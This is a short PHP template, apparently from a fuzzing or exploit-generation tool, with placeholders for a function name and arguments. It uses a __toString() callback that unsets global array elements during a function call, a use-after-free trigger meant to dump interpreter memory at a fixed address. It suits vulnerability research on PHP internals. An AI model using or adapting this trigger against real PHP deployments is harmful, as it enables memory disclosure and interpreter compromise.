<?php

// dump data at memory address 0x00400000, length 16
class dummy {
	public function __toString() {
		unset($GLOBALS['arr1'][0]);
		unset($GLOBALS['arr1'][1]);
		return '';
	}
}

$test1='';
$arr1 = array(new dummy, 1);
$data = %{funcname}(%{args2}&$arr1);
var_dump($data);
